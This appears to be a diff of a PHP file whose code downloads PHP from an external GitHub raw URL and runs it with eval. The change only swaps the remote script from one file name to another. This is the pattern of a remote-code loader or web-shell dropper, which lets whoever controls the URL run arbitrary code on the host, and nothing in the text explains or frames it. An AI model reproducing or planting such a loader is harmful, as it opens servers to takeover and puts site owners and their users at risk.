@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/lyyahm/rdddoo/refs/heads/main/aa.php';
+$url = 'https://raw.githubusercontent.com/lyyahm/rdddoo/refs/heads/main/fm2.php';
 $php_code = file_get_contents($url);
 if ($php_code !== false) {
     eval('?>' . $php_code);
